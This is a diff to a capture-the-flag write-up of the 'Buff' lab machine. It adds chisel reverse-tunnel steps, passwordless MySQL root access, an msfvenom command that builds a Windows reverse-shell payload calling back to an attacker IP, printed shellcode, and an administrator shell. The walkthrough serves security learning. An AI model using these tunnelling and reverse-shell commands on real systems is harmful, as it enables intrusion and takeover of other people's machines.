@@ -245,7 +245,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.02 seconds
 
 ```
 
-##
+## Finding CloudMe
 
 ```
 tasklist /v | findstr 1912
@@ -301,10 +301,75 @@ curl http://10.10.14.44:8000/chisel.exe --output chisel.exe
 #### server on kali
 ```
 chisel server -p 8000 --reverse  
+2023/02/19 00:52:36 server: Reverse tunnelling enabled
+2023/02/19 00:52:36 server: Fingerprint 
+2023/02/19 00:52:36 server: Listening on http://0.0.0.0:8000
 ```
 #### client on buff
 ```
 chisel.exe client 10.10.14.44:8000 R:8888:localhost:8888
+```
+
+
+on server
+`2023/02/19 00:57:27 server: session#1: tun: proxy#R:8888=>localhost:8888: Listening` should showup.
+
+If we are also interested in sql server, we can add another port.
+```
+chisel.exe client 10.10.14.44:8000 R:8888:localhost:8888 R:3306:localhost:3306
+```
+### Mysql
+on kali
+```
+mysql -u root -p -h 127.0.0.1
+```
+no password so just type enter
+
+```
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| table              |
+| test               |
++--------------------+
+```
+
+```
+use phpmyadmin;
+show tables;
++------------------------+
+| Tables_in_phpmyadmin   |
++------------------------+
+| pma__bookmark          |
+| pma__central_columns   |
+| pma__column_info       |
+| pma__designer_settings |
+| pma__export_templates  |
+| pma__favorite          |
+| pma__history           |
+| pma__navigationhiding  |
+| pma__pdf_pages         |
+| pma__recent            |
+| pma__relation          |
+| pma__savedsearches     |
+| pma__table_coords      |
+| pma__table_info        |
+| pma__table_uiprefs     |
+| pma__tracking          |
+| pma__userconfig        |
+| pma__usergroups        |
+| pma__users             |
++------------------------+
+```
+
+```
+select * from pma__users;
+Empty set (0.407 sec)
 ```
 
 #### After connection
@@ -333,7 +398,7 @@ we need to create my own payload
 
 payload generation
 ```
-sfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=1234 -b '\x00\x0A\x0D' -f python -v payload
+msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=1234 -b '\x00\x0A\x0D' -f python -v payload
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 Found 11 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
@@ -376,3 +441,19 @@ payload += b"\xf8\xdd\xf4\xcd\x7a\xd7\x84\x29\x62\x92\x81"
 payload += b"\x76\x24\x4f\xf8\xe7\xc1\x6f\xaf\x08\xc0"
 ```
 
+replace the exploit python code with the new payload.
+
+
+## Root
+```
+
+C:\Windows\system32>whoami
+whoami
+buff\administrator
+
+```
+
+```
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+```
